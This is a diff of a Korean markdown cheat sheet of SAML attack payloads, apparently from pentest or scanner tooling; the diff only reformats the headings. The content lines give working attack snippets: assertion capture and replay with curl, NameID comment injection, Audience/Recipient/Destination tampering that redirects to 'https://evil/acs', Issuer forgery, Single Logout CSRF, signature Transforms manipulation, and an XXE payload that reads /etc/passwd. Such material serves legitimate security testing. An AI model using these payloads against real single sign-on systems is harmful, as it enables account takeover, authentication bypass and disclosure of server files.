@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**SAML Response 캡처 (Playwright):**
+#### SAML Response 캡처 (Playwright)
 ```javascript
 const { chromium } = require('playwright');
 (async () => {
@@ -58,13 +58,13 @@ SAMLResponse=<변조_Base64>&RelayState=/dashboard
 <saml:NameID>admin<!--->@target.com</saml:NameID>
 ```
 
-**Replay (Assertion 재사용):**
+#### Replay (Assertion 재사용)
 ```bash
 # 이전 Response 그대로 재전송 (1회용 캐시 없으면)
 curl -X POST "https://target/acs" -d "SAMLResponse=<이전_Response>&RelayState=/dashboard"
 ```
 
-**Audience/Recipient/Destination 변조:**
+#### Audience/Recipient/Destination 변조
 ```python
 # 다른 SP용 Assertion 재사용
 xml = xml.replace('<Audience>target.com</Audience>', '<Audience>other-sp.com</Audience>')
@@ -72,7 +72,7 @@ xml = xml.replace('Recipient="https://target/acs"', 'Recipient="https://evil/acs
 xml = xml.replace('Destination="https://target/acs"', 'Destination="https://evil/acs"')
 ```
 
-**Issuer 변조:**
+#### Issuer 변조
 ```xml
 <saml:Issuer>https://malicious-idp.com</saml:Issuer>
 <!-- iss 검증 누락 시 다른 IdP의 토큰 통과 -->
@@ -84,13 +84,13 @@ xml = xml.replace('Destination="https://target/acs"', 'Destination="https://evil
 # sandbox에선 /etc/hosts 수정 또는 프록시로 시뮬레이션
 ```
 
-**SLO (Single Logout) CSRF:**
+#### SLO (Single Logout) CSRF
 ```bash
 # LogoutRequest 서명 없이 강제 로그아웃
 curl -X POST "https://target/slo" -d "SAMLRequest=<위조_LogoutRequest>"
 ```
 
-**`<ds:Transforms>` 조작:**
+#### `<ds:Transforms>` 조작
 ```xml
 <ds:SignedInfo>
   <ds:Reference URI="">
@@ -103,7 +103,7 @@ curl -X POST "https://target/slo" -d "SAMLRequest=<위조_LogoutRequest>"
 </ds:SignedInfo>
 ```
 
-**XXE 결합 (xxe-scanner 영역):**
+#### XXE 결합 (xxe-scanner 영역)
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
